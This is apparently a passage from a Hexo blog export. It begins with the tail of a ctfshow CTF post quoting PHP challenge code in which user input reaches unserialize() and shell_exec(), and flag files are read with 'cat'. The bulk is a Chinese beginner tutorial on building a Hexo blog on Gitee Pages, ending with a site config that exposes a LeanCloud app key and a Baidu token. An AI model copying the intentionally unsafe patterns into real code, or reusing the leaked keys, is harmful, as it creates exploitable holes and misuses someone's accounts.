is right?';r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function evilFunction($m,$k)&#123;r</span></span><br><span class="line"><span class="string">	$key = 'ffffffff';r</span></span><br><span class="line"><span class="string">	$content = call_user_func($m);r</span></span><br><span class="line"><span class="string">	if(stripos($content, $key)!==FALSE &amp;&amp; $k==shell_exec('cat \/FLAG\/FLAG649'))&#123;r</span></span><br><span class="line"><span class="string">		echo shell_exec('cat \/FLAG\/FLAG650');r</span></span><br><span class="line"><span class="string">	&#125;else&#123;r</span></span><br><span class="line"><span class="string">		echo 'you are not ffffffff?';r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function evilArray($m,$k)&#123;r</span></span><br><span class="line"><span class="string">	$arrays=unserialize($m);r</span></span><br><span class="line"><span class="string">	if($arrays!==false)&#123;r</span></span><br><span class="line"><span class="string">		if(array_key_exists('username', $arrays) &amp;&amp; in_array('ctfshow', get_object_vars($arrays)) &amp;&amp;  $k==shell_exec('cat \/FLAG\/FLAG650'))&#123;r</span></span><br><span class="line"><span class="string">			echo shell_exec('cat \/FLAG\/FLAG651');r</span></span><br><span class="line"><span class="string">		&#125;else&#123;r</span></span><br><span class="line"><span class="string">			echo 'array?';r</span></span><br><span class="line"><span class="string">		&#125;r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function netTest($cmd)&#123;r</span></span><br><span class="line"><span class="string">	$ret = array(r</span></span><br><span class="line"><span class="string">		'code'=&gt;0,r</span></span><br><span class="line"><span class="string">		'message'=&gt;'\u547d\u4ee4\u6267\u884c\u5931\u8d25'r</span></span><br><span class="line"><span class="string">	);r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">	if(preg_match('\/^[A-Za-z]+$\/', $cmd))&#123;r</span></span><br><span class="line"><span class="string">		$res = shell_exec($cmd);r</span></span><br><span class="line"><span class="string">		stripos(PHP_OS,'WIN')!==FALSE?$ret['message']=iconv(\"GBK\", \"UTF-8\", $res):$ret['message']=$res;r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">	r</span></span><br><span class="line"><span class="string">	return json_encode($ret);r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">"</span>&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建小白“启程”</title>
    <url>/posts/21397.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>这是一篇有关如何使用Gitee Pages和hexo搭建属于自己独立博客的小白教程，这也是我搭建好自己博客之后写的第一篇博客，刚开始在搭建博客的时候也是各种问度娘，所以想要自己写一篇能让大家少走弯路，<strong><em>一条龙服务开始</em></strong>。</p>
</blockquote>
<h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><blockquote>
<p><strong>Gitee Pages</strong> 可以被认为是用户编写的、托管在Gitee上的静态网页。使用Gitee Pages可以为你提供一个免费的服务器，免去了自己搭建服务器和写数据库的麻烦。此外还可以绑定自己的域名。其实也可以使用<strong>Github Pages</strong>，但是<strong>Github Pages</strong>由于是国外的所以国内访问速度太慢，我就安利大家使用<strong>Gitee Pages</strong> 。</p>
<p><strong>Hexo</strong>是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>
</blockquote>
<h1 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h1><blockquote>
<p><a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Nodo.js下载官网</a></p>
<p>按需下载相应的版本， 默认安装就可以了。</p>
<p>这是我目前使用的版本</p>
<p><a href="https://pan.baidu.com/s/1_mLki5Vx5hGdBffc33m5Ag" target="_blank" rel="noopener">百度云盘 </a>提取码: gylq</p>
</blockquote>
<h1 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h1><blockquote>
<p><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">Git下载官网</a></p>
<p>按需下载相应的版本， 默认安装就可以了。</p>
<p>这是我目前使用的版本</p>
<p><a href="https://pan.baidu.com/s/1Wg-a8lEBoDMfObg7i9S1dQ" target="_blank" rel="noopener">百度云盘 </a>提取码: gylq</p>
</blockquote>
<h2 id="检验Git是否安装成功"><a href="#检验Git是否安装成功" class="headerlink" title="检验Git是否安装成功"></a>检验Git是否安装成功</h2><blockquote>
<p>同时按下 Win 键和 R 键打开运行窗口,输入 cmd ，然后输入以下命令，有相应版本信息显示则安装成功，若不正确可以卸载软件重新安装，此外若安装成功，在桌面右键鼠标，可以看到菜单里多了 Git GUI Here 和 Git Bash Here两个选项，第一个是图形界面的Git操作，另一个是命令行，打开Git Bash here执行以下命令</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ git --version  </span><br><span class="line">$ node -v  </span><br><span class="line">$ npm -v</span><br></pre></td></tr></table></figure></div>

<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6YWZYdC5wbmc?x-oss-process=image/format,png" alt="image 20200725133233212"></p>
<blockquote>
<p>在<strong>Git Bash Here</strong>中进行上述命令操作</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6YVc2SS5wbmc?x-oss-process=image/format,png" alt="image 20200725133347942"></p>
</blockquote>
<h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><blockquote>
<p>安装所有要求后，您可以使用npm安装Hexo：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h2 id="Hexo-初始化配置"><a href="#Hexo-初始化配置" class="headerlink" title="Hexo 初始化配置"></a>Hexo 初始化配置</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ hexo init &lt;文件夹&gt; </span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>我使用的&lt;文件夹名&gt;是<strong>blog</strong>，名称随意，稍微等待几分钟估计就好会出现一个文件夹</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6QkYzUS5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>红线标注</strong>位置是你刚刚新建的文件夹路径</p>
<p>Hexo安装完成后，将会在指定文件夹中新建所需要的文件，Hexo 文件夹下的目录如下：</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6QlVVSy5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<h1 id="本地查看效果"><a href="#本地查看效果" class="headerlink" title="本地查看效果"></a>本地查看效果</h1><blockquote>
<p>执行以下命令，执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ hexo s -g</span><br></pre></td></tr></table></figure></div>

<p>首先使用<strong>cd blog</strong> 进入你的文件夹路径，然后<strong>步骤二</strong>直接使用以上命令。</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6RGRacS5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p>此时你可以打开预览 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a>效果了</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI1L1V6RDJMUi5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>此时你已经基本上完成了创建博客的一半</strong></p>
</blockquote>
<h1 id="将博客部署到-Gitee-Pages-上"><a href="#将博客部署到-Gitee-Pages-上" class="headerlink" title="将博客部署到 Gitee Pages 上"></a>将博客部署到 Gitee Pages 上</h1><blockquote>
<p>到目前为止，我们的本地博客就成功搭建了，但是现在我们只能通过本地连接查看博客，我们要做的是让其他人也能够访问我们的博客，这就需要我们将博客部署到Gitee Pages上</p>
</blockquote>
<h2 id="注册-Gitee-账户"><a href="#注册-Gitee-账户" class="headerlink" title="注册 Gitee 账户"></a>注册 Gitee 账户</h2><blockquote>
<p><a href="https://gitee.com/" target="_blank" rel="noopener">官方gitee注册</a></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwWUZQSi5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<h2 id="创建项目代码库"><a href="#创建项目代码库" class="headerlink" title="创建项目代码库"></a>创建项目代码库</h2><img src="https://s1.ax1x.com/2020/07/26/apt00K.png" width = "600" />

<h2 id="安装hexo部署"><a href="#安装hexo部署" class="headerlink" title="安装hexo部署"></a>安装hexo部署</h2><blockquote>
<p>*<em>$ npm install hexo-deployer-git –save *</em></p>
<p>命令表示安装 hexo 部署到 git page 的 deployer</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwdFJYdC5wbmc?x-oss-process=image/format,png" alt="}C}MX9G S{6AE74[`U@}]4X"></p>
</blockquote>
<h1 id="将本地的-Hexo-文件更新到-Gitee-的库中"><a href="#将本地的-Hexo-文件更新到-Gitee-的库中" class="headerlink" title="将本地的 Hexo 文件更新到 Gitee 的库中"></a>将本地的 Hexo 文件更新到 Gitee 的库中</h1><blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwVVpNbi5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p>已经<strong>部署好了hexo之后</strong>找到你的<strong>blog</strong>文件夹</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwVWtHUS5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<img src="https://s1.ax1x.com/2020/07/26/apNjxA.png" width = "600" />
</blockquote>
<blockquote>
<p>接着设定好了<strong>config</strong>之后执行下面”命令”,<strong><em>注意：若出现要输入账号和密码，直接输入你gitee的用户名和密码即可，若失败可在多试几次</em></strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hexo clean（该选项可以清除缓存）</span><br><span class="line">hexo d -g</span><br></pre></td></tr></table></figure></div>

<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwVVRRcy5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><img src="https://img-blog.csdnimg.cn/20200726132023797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1OTM4NjIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
<blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwVXFlMC5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>这代表你已经成功上传到了gitee上面。</strong></p>
</blockquote>
<h1 id="进行gitee-page部署"><a href="#进行gitee-page部署" class="headerlink" title="进行gitee page部署"></a>进行gitee page部署</h1><blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwYUNPMS5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwYUVGTy5wbmc?x-oss-process=image/format,png" alt="image">)<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwYTAwMC5wbmc?x-oss-process=image/format,png" alt="image">)<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwYWwwUC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<h1 id="在博客上发表文章"><a href="#在博客上发表文章" class="headerlink" title="在博客上发表文章"></a>在博客上发表文章</h1><p><strong>博客已经成功搭建了，但是我们该怎么写博客呢？</strong></p>
<p><strong>找到你的路径项目 \blog\source_posts 中</strong></p>
<blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2Fwd0NhNi5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>用编辑器编写文章</strong></p>
<p><strong>md 全称 Markdown， Markdown 是 2004 年由 John Gruberis 设计和开发的纯文本格式的语法，非常的简单实用，常用的标记符号屈指可数，几分钟即可学会， .md 文件可以使用支持 Markdown 语法的编辑器编辑，然后保存文件到 \Hexo\source_posts 文件夹下即可</strong></p>
<p>*<em>推荐 Windows 上使用 MarkdownPad2 或者小书匠 编辑器，macOS 上使用 Mou 编辑器，Linux 上使用 Remarkable编辑器，Web 端上使用CSDN *</em></p>
<p>我推荐我目前使用<strong>Typora</strong>因为此软件可以非常方便的处理排版和图片，像一个小型word</p>
<p>Typora<a href="https://pan.baidu.com/s/15QryXcrEPYYsEBCUN_Mxbg" target="_blank" rel="noopener">百度云盘</a>提取码：gylq</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwZGFDRC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<p><strong>文章标题，标签，分类，封面图片，摘要等，可以在 Front-matter 里面配置（Front-matter 是文件最上方以 — 分隔的区域，用于指定个别文件的变量，官方文档：<a href="https://hexo.io/zh-cn/docs/front-matter" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/front-matter</a> ），举个例子：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">layout: 页面布局（配合主题文档使用）</span><br><span class="line">title: 文章名称</span><br><span class="line">date: 文章日期</span><br><span class="line">comments: 文章是否开启评论</span><br><span class="line">photos: 文章封面图（仅部分主题支持）</span><br><span class="line">tags: </span><br><span class="line">  - 文章标签一</span><br><span class="line">  - 文章标签二</span><br><span class="line">categories: 文章分类</span><br><span class="line">description: 文章描述，即要在首页显示的摘要（仅部分主题支持）</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">这里是摘要</span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">这里是正文</span><br><span class="line"></span><br><span class="line">注意：description 和 &lt;!-- more --&gt; 方式显示摘要二选一即可，部分主题不支持description，每个配置英文冒号后面要空一格，不同主题配置有所差异，具体要参考主题文档</span><br></pre></td></tr></table></figure></div>



<p>当我们用编辑器写好文章后，可以使用以下命令将其推送到服务器上</p>
<blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hexo d -g </span><br></pre></td></tr></table></figure></div>

<p>记住推送了之后要在<strong>gitee page</strong>中进行更新哦</p>
</blockquote>
<h1 id="博客更换自己喜欢的主题"><a href="#博客更换自己喜欢的主题" class="headerlink" title="博客更换自己喜欢的主题"></a>博客更换自己喜欢的主题</h1><p><strong><em>博客也搭建好了，文章也会写了，默认的主题并不喜欢怎么办？现在，我们就来为自己的博客更换自己喜欢的主题。</em></strong></p>
<p><strong><a href="https://hexo.io/themes/" target="_blank" rel="noopener">hexo官方主题专栏</a>我们可以看见有许多的主题供我们选择</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2Fwd0tkUC5wbmc?x-oss-process=image/format,png" alt="image"></p>
<blockquote>
<p><strong>这里我们来用Next主题做个举例</strong></p>
<p><strong>点进行之后会出现next的使用文档</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2Fwd0RXRi5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<p>接着复制上图中的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;hexo-theme-next themes&#x2F;next</span><br></pre></td></tr></table></figure></div>
</blockquote>
<blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2Fwdzd5ZC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<p>接着下载成功之后</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMHBsUS5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p>你会发现你的目录<strong>\blog\themes</strong>出现了next主题</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMFpmVS5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p>接着修改你的config中theme指向</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMGZucy5wbmc?x-oss-process=image/format,png" alt="image 20200726101821507">)<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMHRwRC5wbmc?x-oss-process=image/format,png" alt="image"></p>
<p><strong>成图</strong></p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwMElBMC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<blockquote>
<p>接着我们在预览一遍</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure></div>

<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwQlAzRC5wbmc?x-oss-process=image/format,png" alt="image"></p>
</blockquote>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMS5heDF4LmNvbS8yMDIwLzA3LzI2L2FwclNTTy5wbmc?x-oss-process=image/format,png" alt="image 20200726102205443"></p>
<blockquote>
<p>接着在部署更新一遍就好了，重复上面步骤，就可以拥有一个特色的个人博客了。</p>
</blockquote>
<p>这是我的博客地址 <a href="https://gylq.gitee.io/">孤桜懶契</a>  欢迎大家来访。</p>
<p>这是我博客的配置信息</p>
<h1 id="站点-config-配置信息"><a href="#站点-config-配置信息" class="headerlink" title="站点 config 配置信息"></a><strong><em>站点 config 配置信息</em></strong></h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;configuration.html</span><br><span class="line">## Source: https:&#x2F;&#x2F;github.com&#x2F;hexojs&#x2F;hexo&#x2F;</span><br><span class="line"></span><br><span class="line"># Site</span><br><span class="line">title: 孤桜懶契</span><br><span class="line">subtitle: Run</span><br><span class="line">description: 生活分享</span><br><span class="line">keywords: 孤桜懶契 </span><br><span class="line">author: 孤桜懶契</span><br><span class="line">language: zh-Hans  #语言</span><br><span class="line">timezone: &#39;&#39;</span><br><span class="line"></span><br><span class="line"># URL</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;yoursite.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: https:&#x2F;&#x2F;gylq.gitee.io&#x2F;</span><br><span class="line">root: &#x2F;</span><br><span class="line">permalink: :year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#39;index.html&#39; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#39;.html&#39; from permalinks</span><br><span class="line"></span><br><span class="line"># 文章链接唯一永久化</span><br><span class="line">#abbrlink:</span><br><span class="line">  #alg: crc32  #算法： crc16(default) and crc32</span><br><span class="line"> # rep: dec    #进制： dec(default) and hex</span><br><span class="line"></span><br><span class="line"># Directory</span><br><span class="line">source_dir: source</span><br><span class="line">public_dir: public</span><br><span class="line">tag_dir: tags</span><br><span class="line">archive_dir: archives</span><br><span class="line">category_dir: categories</span><br><span class="line">code_dir: downloads&#x2F;code</span><br><span class="line">i18n_dir: :lang</span><br><span class="line">skip_render: love&#x2F;**</span><br><span class="line"></span><br><span class="line"># Writing</span><br><span class="line">new_post_name: :title.md # File name of new posts</span><br><span class="line">default_layout: post</span><br><span class="line">titlecase: false # Transform title into titlecase</span><br><span class="line">external_link:</span><br><span class="line">  enable: true # Open external links in new tab</span><br><span class="line">  field: site # Apply to the whole site</span><br><span class="line">  exclude: &#39;&#39;</span><br><span class="line">filename_case: 0</span><br><span class="line">render_drafts: false</span><br><span class="line">post_asset_folder: false</span><br><span class="line">relative_link: false</span><br><span class="line">future: true</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  line_number: true</span><br><span class="line">  auto_detect: false</span><br><span class="line">  tab_replace: &#39;&#39;</span><br><span class="line">  wrap: true</span><br><span class="line">  hljs: false</span><br><span class="line"></span><br><span class="line"># Home page setting</span><br><span class="line"># path: Root path for your blogs index page. (default &#x3D; &#39;&#39;)</span><br><span class="line"># per_page: Posts displayed per page. (0 &#x3D; disable pagination)</span><br><span class="line"># order_by: Posts order. (Order by date descending by default)</span><br><span class="line">index_generator:</span><br><span class="line">  path: &#39;&#39;</span><br><span class="line">  per_page: 10</span><br><span class="line">  order_by: -date</span><br><span class="line"></span><br><span class="line"># Category &amp; Tag</span><br><span class="line">default_category: uncategorized</span><br><span class="line">category_map:</span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"># Metadata elements</span><br><span class="line">## https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTML&#x2F;Element&#x2F;meta</span><br><span class="line">meta_generator: true</span><br><span class="line"></span><br><span class="line"># Date &#x2F; Time format</span><br><span class="line">## Hexo uses Moment.js to parse and display date</span><br><span class="line">## You can customize the date format as defined in</span><br><span class="line">## http:&#x2F;&#x2F;momentjs.com&#x2F;docs&#x2F;#&#x2F;displaying&#x2F;format&#x2F;</span><br><span class="line">date_format: YYYY-MM-DD</span><br><span class="line">time_format: HH:mm:ss</span><br><span class="line">## Use post&#39;s date for updated date unless set in front-matter</span><br><span class="line">use_date_for_updated: false</span><br><span class="line"></span><br><span class="line"># Pagination</span><br><span class="line">## Set per_page to 0 to disable pagination</span><br><span class="line">per_page: 10</span><br><span class="line">pagination_dir: page</span><br><span class="line"></span><br><span class="line"># Include &#x2F; Exclude file(s)</span><br><span class="line">## include:&#x2F;exclude: options only apply to the &#39;source&#x2F;&#39; folder</span><br><span class="line">include:</span><br><span class="line">exclude:</span><br><span class="line">ignore:</span><br><span class="line"></span><br><span class="line"># Extensions</span><br><span class="line">## Plugins: https:&#x2F;&#x2F;hexo.io&#x2F;plugins&#x2F;</span><br><span class="line">## Themes: https:&#x2F;&#x2F;hexo.io&#x2F;themes&#x2F;</span><br><span class="line">theme: nextup</span><br><span class="line"></span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line">deploy:</span><br><span class="line">    type: git</span><br><span class="line">    repository: </span><br><span class="line">       - https:&#x2F;&#x2F;gitee.com&#x2F;gylq&#x2F;GYLQ</span><br><span class="line">       - https:&#x2F;&#x2F;github.com&#x2F;GYLQ&#x2F;GYLQ.github.io</span><br><span class="line">    branch: master</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># backup</span><br><span class="line">backup:</span><br><span class="line">  type: git</span><br><span class="line">  theme: nextup</span><br><span class="line">  repository:</span><br><span class="line">    - https:&#x2F;&#x2F;gitee.com&#x2F;gylq&#x2F;backup.git,backup</span><br><span class="line"></span><br><span class="line"># Search</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br><span class="line"></span><br><span class="line">leancloud_counter_security:</span><br><span class="line">  enable_sync: true</span><br><span class="line">  app_id: HzU5gDhBUYHF8QTF8DmbGhjD-gzGzoHsz</span><br><span class="line">  app_key: wp1HNJ17SdpnE0wIFq99eTKH</span><br><span class="line">  username: # Will be asked while deploying if is left blank</span><br><span class="line">  password: # Recommmended to be left blank. Will be asked while deploying if is left blank</span><br><span class="line"></span><br><span class="line"># Extensions</span><br><span class="line">## Plugins: http:&#x2F;&#x2F;hexo.io&#x2F;plugins&#x2F;</span><br><span class="line">#RSS订阅</span><br><span class="line">plugin:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line">#Feed Atom</span><br><span class="line">feed:</span><br><span class="line">type: atom</span><br><span class="line">path: atom.xml</span><br><span class="line">limit: 20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># https:&#x2F;&#x2F;blog.csdn.net&#x2F;lewky_liu&#x2F;article&#x2F;details&#x2F;82432003</span><br><span class="line"># https:&#x2F;&#x2F;github.com&#x2F;rozbo&#x2F;hexo-neat</span><br><span class="line">neat_enable: true</span><br><span class="line"># 压缩html</span><br><span class="line">neat_html:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line"># 压缩css</span><br><span class="line">neat_css:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">  - &#39;**&#x2F;*.min.css&#39;</span><br><span class="line">  - &#39;**&#x2F;needsharebutton.css&#39;</span><br><span class="line"># 压缩js</span><br><span class="line">neat_js:</span><br><span class="line">  enable: true</span><br><span class="line">  mangle: true</span><br><span class="line">  output:</span><br><span class="line">  compress:</span><br><span class="line">  exclude:</span><br><span class="line">  - &#39;**&#x2F;*.min.js&#39;</span><br><span class="line">  - &#39;**&#x2F;jquery.fancybox.pack.js&#39;</span><br><span class="line">  - &#39;**&#x2F;index.js&#39;</span><br><span class="line">  - &#39;**&#x2F;waifu-tips.js&#39;</span><br><span class="line">  - &#39;**&#x2F;iframe.js&#39;</span><br><span class="line">  - &#39;**&#x2F;fireworks.js&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Security</span><br><span class="line">##</span><br><span class="line">encrypt:</span><br><span class="line">    enable: true</span><br><span class="line"></span><br><span class="line">baidu_url_submit:</span><br><span class="line">  count: 1               # 提交最新的多少个链接</span><br><span class="line">  host: gylq.gitee.io    # 在百度站长平台中添加的域名</span><br><span class="line">  token: J4AuJNJ3lc4J8GAQ      # 秘钥</span><br><span class="line">  path: baidu_urls.txt   # 文本文档的地址， 新链接会保存在此文本文档里</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

